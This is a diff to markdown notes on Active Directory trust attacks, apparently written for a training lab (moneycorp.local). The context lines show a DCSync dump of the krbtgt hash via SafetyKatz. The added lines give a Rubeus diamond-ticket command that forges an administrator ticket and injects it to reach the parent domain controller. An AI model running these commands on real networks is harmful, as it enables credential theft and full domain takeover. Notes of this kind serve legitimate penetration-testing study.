@@ -23,6 +23,11 @@ Run DCsync on parent domain
 C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
+Access parent domain DC
+```powershell
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args diamond /krbkey:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /tgtdeleg /enctype:aes /ticketuser:administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
 > **Note:** Can only access resources that were explicitly shared with you
 
 Across external trusts - OPtH and obtain trust key
